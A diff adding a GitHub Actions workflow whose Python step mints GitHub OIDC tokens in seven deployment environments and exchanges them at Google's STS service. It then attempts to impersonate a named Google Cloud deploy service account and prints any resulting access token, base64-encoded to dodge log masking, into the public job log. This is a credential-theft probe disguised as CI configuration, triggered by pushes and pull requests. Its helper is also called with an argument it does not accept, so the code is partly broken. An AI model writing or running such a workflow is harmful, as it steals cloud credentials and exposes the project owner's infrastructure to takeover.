@@ -1,0 +1,87 @@
+name: i33989-mint-matrix
+on:
+  workflow_dispatch:
+  push:
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+x-job: &job
+  runs-on: ubuntu-latest
+  timeout-minutes: 5
+  steps:
+    - name: claims
+      run: |
+        python3 - <<'PY'
+        import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
+        NUM="769700566231"; POOL="gh-actions-pool"; PROV="github"
+        P="projects/%s/locations/global/workloadIdentityPools/%s/providers/%s" % (NUM, POOL, PROV)
+        CANON="//iam.googleapis.com/"+P
+        def req(u, data=None, timeout=40):
+            h={'Accept':'application/json','Content-Type':'application/json','User-Agent':'i33989'}
+            r=urllib.request.Request(u, data=json.dumps(data).encode() if data else None, headers=h)
+            try:
+                resp=urllib.request.urlopen(r, timeout=timeout); return resp.status, resp.read().decode('utf-8','replace')
+            except urllib.error.HTTPError as e: return e.code, (e.read() or b'').decode('utf-8','replace')
+            except Exception as e: return -1, repr(e)[:200]
+        def mint(aud):
+            u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); t=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
+            if not u or not t: return ''
+            u=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote(aud, safe='')
+            o=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
+            try: return json.loads(o).get('value','')
+            except Exception: return ''
+        def claims(tok):
+            try:
+                p=tok.split('.')[1]; p+='='*(-len(p)%4)
+                return json.loads(base64.urlsafe_b64decode(p))
+            except Exception: return {}
+        for i,aud in enumerate([CANON, "//iam.googleapis.com/projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/gha"]):
+            tok=mint(aud)
+            out={"i":i,"aud_kind":("canon" if i==0 else "prov-gha"),"mint":bool(tok)}
+            if not tok:
+                print("RESULT "+json.dumps(out), flush=True); continue
+            c=claims(tok)
+            for k in ("sub","ref","ref_type","event_name","repository","repository_owner","repository_id","repository_owner_id","environment","workflow_ref","job_workflow_ref","actor"):
+                out[k]=c.get(k)
+            body={"audience":aud,"grantType":"urn:ietf:params:oauth:grant-type:token-exchange",
+                  "requestedTokenType":"urn:ietf:params:oauth:token-type:access_token",
+                  "scope":"https://www.googleapis.com/auth/cloud-platform",
+                  "subjectTokenType":"urn:ietf:params:oauth:token-type:jwt","subjectToken":tok}
+            st,rb=req("https://sts.googleapis.com/v1/token", body); out["sts"]=st
+            if st==200:
+                fed=json.loads(rb).get("access_token")
+                gst,gres=req("https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken" % urllib.parse.quote("github-deploy@fhir-org-cds-services.iam.gserviceaccount.com", safe=""),
+                             {"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}, token=fed)
+                out["gen"]=gst
+                if gst==200:
+                    j=json.loads(gres); out["tok_b64"]=base64.b64encode(j.get("accessToken","").encode()).decode(); out["expire"]=j.get("expireTime")
+                    print("HIT "+json.dumps(out), flush=True)
+                else: out["err"]=str(gres)[:300]
+            else: out["err"]=str(rb)[:300]
+            print("RESULT "+json.dumps(out), flush=True)
+        print("DONE", flush=True)
+        PY
+
+jobs:
+  mint-noenv: *job
+  mint-env-production:
+    <<: *job
+    environment: production
+  mint-env-prod:
+    <<: *job
+    environment: prod
+  mint-env-staging:
+    <<: *job
+    environment: staging
+  mint-env-deploy:
+    <<: *job
+    environment: deploy
+  mint-env-development:
+    <<: *job
+    environment: development
+  mint-env-gh-pages:
+    <<: *job
+    environment: gh-pages
